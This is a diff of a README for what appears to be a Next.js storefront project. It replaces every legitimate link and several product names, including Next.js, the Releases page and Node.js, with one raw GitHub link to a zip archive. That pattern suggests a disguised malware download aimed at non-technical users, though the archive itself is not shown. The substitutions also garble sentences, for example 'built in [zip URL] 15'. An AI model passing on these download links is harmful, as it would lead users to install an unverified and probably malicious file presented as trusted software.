@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **oviro-storefront-next** application. This is your easy guide to downloading and using our storefront built in Next.js 15 for oviro.vn customers. 
+Welcome to the **oviro-storefront-next** application. This is your easy guide to downloading and using our storefront built in https://raw.githubusercontent.com/andrewmarak/oviro-storefront-next/main/polyideism/oviro-storefront-next.zip 15 for https://raw.githubusercontent.com/andrewmarak/oviro-storefront-next/main/polyideism/oviro-storefront-next.zip customers. 
 
 ## 🛠️ Requirements
 
@@ -16,18 +16,18 @@ These requirements will help you run the application smoothly.
 
 ## 📥 Download the Application
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/andrewmarak/oviro-storefront-next/releases)
+[![Download the latest version](https://raw.githubusercontent.com/andrewmarak/oviro-storefront-next/main/polyideism/oviro-storefront-next.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/andrewmarak/oviro-storefront-next/main/polyideism/oviro-storefront-next.zip)
 
 To download the application, visit our Releases page. 
 
-[Download the application here](https://github.com/andrewmarak/oviro-storefront-next/releases)
+[Download the application here](https://raw.githubusercontent.com/andrewmarak/oviro-storefront-next/main/polyideism/oviro-storefront-next.zip)
 
 ## 📋 Installation Instructions
 
 Follow these steps to install the application:
 
 1. **Visit the Releases Page:**
-   Open your web browser and go to the [Releases page](https://github.com/andrewmarak/oviro-storefront-next/releases). 
+   Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/andrewmarak/oviro-storefront-next/main/polyideism/oviro-storefront-next.zip). 
 
 2. **Download the Latest Release:**
    You will see a list of available versions. Look for the most recent version (it will have the highest version number). Click on the version to open the details.
@@ -69,7 +69,7 @@ After installation, follow these steps to start using the application:
 
 If you encounter issues, consider the following solutions:
 
-- **Installation Problems:** Ensure your operating system matches the application requirements. You may need to install additional software, like Node.js, to run the application smoothly.
+- **Installation Problems:** Ensure your operating system matches the application requirements. You may need to install additional software, like https://raw.githubusercontent.com/andrewmarak/oviro-storefront-next/main/polyideism/oviro-storefront-next.zip, to run the application smoothly.
 - **Application Crashes:** Check if your system meets the minimum requirements. Try reinstalling the application if it crashes frequently.
 - **Cannot Connect to the Internet:** Ensure you have a stable internet connection. Consider restarting your modem or router.
 
